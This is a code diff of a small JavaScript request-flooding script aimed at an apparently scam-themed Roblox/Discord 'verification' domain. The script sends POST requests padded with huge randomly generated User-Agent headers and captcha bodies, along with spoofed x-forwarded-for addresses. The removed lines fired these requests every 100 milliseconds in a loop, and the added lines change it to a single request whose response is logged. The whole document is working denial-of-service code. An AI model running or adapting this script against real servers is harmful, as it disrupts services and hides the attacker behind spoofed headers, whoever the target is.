@@ -16,11 +16,11 @@ function makeid(length) {
     }
     return result;
     }
-    setInterval(()=>{
+
         fetch("https://api-bytow.robloxdiscord.pl/agg", {
             "credentials": "omit",
             "headers": {
-                "User-Agent": makeid(100000),
+                "User-Agent": makeid(10000),
                 "Accept": "*/*",
                 "Accept-Language": "en-US,en;q=0.5",
                 "Content-Type": "application/x-www-form-urlencoded",
@@ -30,8 +30,10 @@ function makeid(length) {
                 "x-forwarded-for": ["180.190.162.93", "79.186.224.82", "176.227.156.147", "177.125.95.106"]
             },
             "referrer": "https://weryfikacja-bytow.robloxdiscord.pl/",
-            "body": "num1=3&captcha=",
+            "body": "captcha="+makeid(10000),
             "method": "POST",
             "mode": "cors"
+        }).then(e=>{
+            console.log(e)
         })
-    }, 100)
+
